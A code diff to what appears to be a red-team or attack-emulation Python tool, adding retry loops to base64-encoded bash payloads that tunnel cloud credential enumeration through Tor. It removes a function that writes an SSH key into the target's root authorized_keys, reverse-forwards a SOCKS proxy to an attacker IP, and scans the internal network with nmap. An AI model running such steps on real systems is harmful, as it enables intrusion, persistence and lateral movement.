@@ -237,7 +237,39 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                 try:
                     payload = encode_base64(
-                        'docker stop torproxy || true; docker rm torproxy || true; docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy')
+                        """
+docker stop torproxy || true; docker rm torproxy || true; 
+# Max number of attempts to start the Docker container
+max_attempts=5
+attempt=0
+
+while true; do
+    # Increment the attempt counter
+    ((attempt++))
+
+    echo "Attempt $attempt of $max_attempts"
+
+    # Try to start the Docker container
+    docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy
+
+    # Check if the Docker command was successful
+    if [[ $? -eq 0 ]]; then
+        echo "Docker container started successfully."
+        break
+    else
+        echo "Failed to start Docker container. Retrying..."
+    fi
+
+    # Check if maximum attempts have been reached
+    if [[ $attempt -eq $max_attempts ]]; then
+        echo "Maximum attempts reached, failing now."
+        exit 1
+    fi
+
+    # Wait for a little while before retrying
+    sleep 10
+done
+""")
                     session.log(f"Running payload: {payload}")
                     result = subprocess.run(
                         ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
@@ -247,18 +279,6 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         session.log('The bash script encountered an error.')
                     else:
                         session.log("successfully started torproxy docker.")
-                        session.log(
-                            f"stopping and removing and {script} tunnelled container proxychains-{jobname}-{csp}...")
-                        payload = encode_base64(
-                            f'docker rm --force proxychains-{jobname}-{csp}')
-                        session.log(f"Running payload: {payload}")
-                        result = subprocess.run(
-                            ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
-                        session.log(result)
-
-                        if result.returncode != 0:
-                            session.log(
-                                'The bash script encountered an error.')
 
                         session.log(
                             f"running {script} via torproxy tunnelled container...")
@@ -283,7 +303,39 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 
                         session.log(f"Starting tor tunneled docker...")
                         payload = encode_base64(
-                            f'export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}')
+                            f"""
+docker rm --force proxychains-{jobname}-{csp} || true;
+export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; 
+# Max number of attempts to start the Docker container
+max_attempts=5
+attempt=0
+
+while true; do
+    # Increment the attempt counter
+    ((attempt++))
+    echo "Attempt $attempt of $max_attempts"
+
+    # Try to start the Docker container
+    docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}
+
+    # Check if the Docker command was successful
+    if [[ $? -eq 0 ]]; then
+        echo "Docker container started successfully."
+        break
+    else
+        echo "Failed to start Docker container. Retrying..."
+    fi
+
+    # Check if maximum attempts have been reached
+    if [[ $attempt -eq $max_attempts ]]; then
+        echo "Maximum attempts reached, failing now."
+        exit 1
+    fi
+
+    # Wait for a little while before retrying
+    sleep 10
+done
+""")
                         session.log(f"Running payload: {payload}")
                         result = subprocess.run(
                             ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
@@ -296,59 +348,6 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                                 'The bash script encountered an error.')
                 except Exception as e:
                     session.log(f'Error executing bash script: {e}')
-
-            def socks_scan(session):
-                result = subprocess.run(
-                    ['curl', '-s', 'https://icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
-                attacker_ip = result.stdout
-                session.log(f'Attacker IP: {attacker_ip}')
-
-                # get the attacker lan
-                payload = 'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1'
-                result = run_base64_payload(
-                    session=session, payload=payload, log_name="payload_attackerlan")
-                target_lan = bytes(result.stdout).decode().strip()
-                session.log(f'Target LAN: {target_lan}')
-
-                # transfer files from target to attacker
-                session.log("copying private key to target...")
-                copy_file(
-                    session, source_file='/home/socksuser/.ssh/socksuser_key', dest_file='/tmp/sockskey', direction='local_to_remote')
-                result = run_remote(
-                    session, "/bin/bash -c 'chmod 0600 /tmp/sockskey'")
-                session.log("adding public key to authorized on target...")
-                copy_file(
-                    session, source_file='/home/socksuser/.ssh/socksuser_key.pub', dest_file='/root/.ssh/authorized_keys', direction='local_to_remote')
-
-                # create socksproxy on target
-                session.log('starting socksproxy on target...')
-                payload = 'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'
-                result = run_base64_payload(
-                    session=session, payload=payload, log_name="payload_starttargetsocks")
-                session.log(result)
-
-                # forward local socksproxy to attacker
-                session.log('forwarding target socksproxy to attacker...')
-                payload = f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'
-                result = run_base64_payload(
-                    session=session, payload=payload, log_name="payload_startattackersocks")
-                session.log(result)
-
-                # run nmap scan via proxychains
-                session.log('running proxychains nmap...')
-                result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T2', '-oX', 'scan.xml',
-                                        '-p22,80,443,1433,3306,5000,5432,5900,6379,8000,8080,8088,8090,8091,9200,27017', target_lan], cwd='/tmp', capture_output=True, text=True)
-                session.log(result)
-
-                # kill ssh socksproxy and portforward
-                session.log('killing ssh socksproxy and portforward...')
-                result = run_remote(
-                    session, 'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)')
-                session.log(result)
-
-                # remove temporary archive from target
-                if session.platform.Path('/tmp/sockskey').exists():
-                    session.platform.Path('/tmp/sockskey').unlink()
 
             def prep_local_env(task_name, csp=None):
                 # create work directory
@@ -540,8 +539,6 @@ echo $BUCKET_URL
                     args=""
                 )
                 session.log("credentialed_access_tor complete")
-            elif task_name == "socksscan":
-                socks_scan(session)
             elif task_name == "scan2kubeshell":
                 csp = "aws"
                 enum_exfil_prep_creds(csp, task_name)
